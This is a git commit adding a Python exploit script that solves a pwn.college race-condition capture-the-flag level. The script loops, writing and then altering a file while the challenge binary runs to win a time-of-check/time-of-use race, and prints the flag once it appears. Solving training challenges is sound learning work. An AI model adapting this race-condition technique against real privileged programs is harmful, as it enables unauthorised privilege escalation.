a83d60f70a9789bb580a38707cffc3652d000ac8
九条涼果 <enihsyou@gmail.com>
2026-07-26 21:25:13 +0800

    feat(pwn): Race Conditions Level 3

---
+++ challenges/legacy/system-security/race-conditions/level3-1/flag.py
@@ -0,0 +1,27 @@
+# Level3 1
+import pwn
+import os
+from dojotool import find_challenge
+
+
+def ctf() -> None:
+    root_bin = find_challenge()
+    fake_file = "/home/hacker/f"
+    while True:
+        f = open(fake_file, "wb")
+        f.write(b"A" * 256)
+        f.flush()
+        with pwn.process([root_bin, fake_file], raw=True, level="error") as io:
+            # io.sendline()
+            f.write(pwn.p64(1))
+            f.flush()
+            # io.sendline()
+            data = io.recvrepeat().decode(errors="ignore")
+            if "pwn.college{" in data:
+                print(data)
+                break
+    os.unlink(fake_file)
+
+
+if __name__ == "__main__":
+    ctf()
